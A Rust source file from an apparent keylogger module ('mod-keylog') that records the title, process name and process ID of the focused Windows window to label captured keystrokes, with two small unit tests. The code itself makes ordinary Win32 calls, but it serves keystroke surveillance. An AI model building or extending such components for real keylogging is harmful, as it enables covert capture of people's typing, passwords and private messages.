//! Window tracking for mod-keylog
//!
//! Tracks the currently focused window to provide context for captured keystrokes.
//! On Windows, uses GetForegroundWindow + GetWindowText + GetWindowThreadProcessId.

/// Information about the currently focused window
#[derive(Debug, Clone, Default)]
pub struct WindowInfo {
    /// Window title/caption
    pub title: String,
    /// Process name (e.g., "notepad.exe")
    pub process_name: String,
    /// Process ID
    pub process_id: u32,
}

/// Tracks window changes for keystroke context
pub struct WindowTracker {
    last_info: WindowInfo,
    #[cfg(windows)]
    last_hwnd: isize,
}

impl WindowTracker {
    pub fn new() -> Self {
        Self {
            last_info: WindowInfo::default(),
            #[cfg(windows)]
            last_hwnd: 0,
        }
    }

    /// Get the current foreground window info
    /// Returns Some if the window changed, None if same as before
    #[cfg(target_os = "windows")]
    pub fn get_current(&mut self) -> Option<WindowInfo> {
        use windows_sys::Win32::Foundation::CloseHandle;
        use windows_sys::Win32::System::Threading::{
            OpenProcess, QueryFullProcessImageNameW, PROCESS_QUERY_LIMITED_INFORMATION,
        };
        use windows_sys::Win32::UI::WindowsAndMessaging::{
            GetForegroundWindow, GetWindowTextLengthW, GetWindowTextW,
            GetWindowThreadProcessId,
        };

        unsafe {
            let hwnd = GetForegroundWindow();
            if hwnd == 0 {
                return None;
            }

            // Check if window changed
            if hwnd == self.last_hwnd {
                return None;
            }
            self.last_hwnd = hwnd;

            // Get window title
            let title = {
                let len = GetWindowTextLengthW(hwnd);
                if len <= 0 {
                    String::new()
                } else {
                    let mut buf: Vec<u16> = vec![0u16; (len + 1) as usize];
                    let written = GetWindowTextW(hwnd, buf.as_mut_ptr(), len + 1);
                    if written > 0 {
                        String::from_utf16_lossy(&buf[..written as usize])
                    } else {
                        String::new()
                    }
                }
            };

            // Get process ID
            let mut process_id: u32 = 0;
            GetWindowThreadProcessId(hwnd, &mut process_id);

            // Get process name
            let process_name = if process_id != 0 {
                let handle =
                    OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, process_id);
                if handle != 0 {
                    let mut buf: Vec<u16> = vec![0u16; 260];
                    let mut size: u32 = 260;
                    let result = QueryFullProcessImageNameW(
                        handle,
                        0,
                        buf.as_mut_ptr(),
                        &mut size,
                    );
                    CloseHandle(handle);

                    if result != 0 && size > 0 {
                        let path = String::from_utf16_lossy(&buf[..size as usize]);
                        path.rsplit('\\')
                            .next()
                            .unwrap_or(&path)
                            .to_string()
                    } else {
                        String::from("unknown")
                    }
                } else {
                    String::from("unknown")
                }
            } else {
                String::from("unknown")
            };

            let info = WindowInfo {
                title,
                process_name,
                process_id,
            };

            self.last_info = info.clone();
            Some(info)
        }
    }

    /// Get the current foreground window info (non-Windows stub)
    #[cfg(not(target_os = "windows"))]
    pub fn get_current(&mut self) -> Option<WindowInfo> {
        // On non-Windows, we can't easily get window info
        // Could implement X11/Wayland support here
        None
    }

    /// Get the last known window info without checking for changes
    pub fn last_window(&self) -> &WindowInfo {
        &self.last_info
    }

    /// Force refresh and return current window info
    pub fn refresh(&mut self) -> WindowInfo {
        #[cfg(target_os = "windows")]
        {
            self.last_hwnd = 0; // Reset to force update
        }
        self.get_current().unwrap_or_else(|| self.last_info.clone())
    }
}

impl Default for WindowTracker {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_window_tracker_creation() {
        let tracker = WindowTracker::new();
        assert!(tracker.last_window().title.is_empty());
    }

    #[test]
    fn test_window_info_default() {
        let info = WindowInfo::default();
        assert!(info.title.is_empty());
        assert!(info.process_name.is_empty());
        assert_eq!(info.process_id, 0);
    }
}
